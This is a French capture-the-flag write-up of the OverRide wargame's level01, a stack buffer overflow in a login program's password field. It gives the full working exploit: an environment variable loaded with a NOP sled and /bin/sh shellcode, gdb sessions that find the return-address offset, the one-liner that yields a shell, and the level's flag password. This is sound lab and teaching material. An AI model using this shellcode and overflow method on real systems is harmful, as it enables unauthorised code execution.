# Level 01

## Introduction

Le programme permet la saisie d'un nom d'utilisateur et un mot de passe. Cependant le champ mot de passe accepte 100 caractères alors que la variable char est déclarée à 64.  
Ensuite on injecte simplement un shellcode.

## Resumé

 1. Décompiler le programme : https://dogbolt.org/?id=9d6ffadf-606a-453b-98f3-bd2653ca19f0 ;
 2. Constater dans le code la différence entre l'initialisation de la variable `pass` et la longueur accepté par `fgets` ;
 3. Préparer puis injecter le shellcode "habituel".
    1. `export ICE=$PADDING+$SHELLCODE`
    2. On récupère l'adresse de la variable d'environnement ICE et on fait un +500 pour taper au milieu du padding.
    3. On ajoute l'adresse précédement calculée, là où on segfault dans la saisie du mot de passe.


## Etapes

(Voir [source.c](../source.c) pour le code complet)

Mise en avant du code qui nous intéresse :

```c
int verify_user_name(char *username);
int verify_user_pass(char *text);

int main(int argc, const char **argv, const char **envp)
{
    char          username[256];
    char          pass[64]; // <===
    int           auth = 0;

    // [...]
    if (auth)
    {
        // [...]
    }
    else
    {
        puts("Enter Password: ");
        fgets(s, 100, stdin); // <===
        v5 = verify_user_pass(s); // memcmp avec "admin"
        puts("nope, incorrect password...\n");
    }
    return 1;
}
```

J'utilise mon shellcode "favori" : https://www.exploit-db.com/exploits/13357.

Que je vais glisser dans mes variables d'environnement, pour que je puisse ensuite retrouver se shellcode dans le contenu du 3eme argument du main `const char **envp`.

On note un padding de 1000. Qui permet de ne pas être impacté par un décalage dans les variables d'environnements (entre deux démarrages ou exécutions).

```sh
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"');
```

On récupère l’adresse de la position de la variable d’environnement dans le programme:

```sh
level01@OverRide:~$ gdb ./level01                                                    	 
[...]
(gdb) b main                                                                         	 
Breakpoint 1 at 0x80484d5                                                            	 
(gdb) run                                                                            	 
Starting program: /home/users/level01/level01                                        	 
                                                                                     	 
Breakpoint 1, 0x080484d5 in main ()                                                  	 
(gdb) x/20s environ                                                                   	
0xffffdbb8:  	"ICE=\220\220\220\220\220\220\220\220\220\220\220
```

Donc `0xffffdbb8 + 500 = 0xff ff dd ac` => `\xac\xdd\xff\xff`

Le but consiste à segfault sur l’adresse `0x626262` qui correspond à `bbbb`. On incrément `"a" * 64`, jusqu'à tomber sur un segfault `0x62626262 in ?? ()`, ici `75`.

```sh
(gdb) run < <(echo "dat_wil" ; python -c 'print "admin" + "a" * 75 + "bbbb"')
[...]

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
```

Pour avoir plus d’info sur le segfault : `dmesg | grep segfault` ou `i r` sous **gdb**.

```sh
run < <(echo "dat_wil" ; python -c 'print "admin" + "a" * 75 + "\xac\xdd\xff\xff"')

dmesg | grep segfault
# ou 'i r' sous gdb
```

On a donc un décallage de `75` :

```sh
level01@OverRide:~$ (echo "dat_wil" ; python -c 'print "admin" + "a" * 75 + "\xac\xdd\xff\xff"') | ./level01
```

```
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

$ whoami
level02
```

Donc le flag :

```sh
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
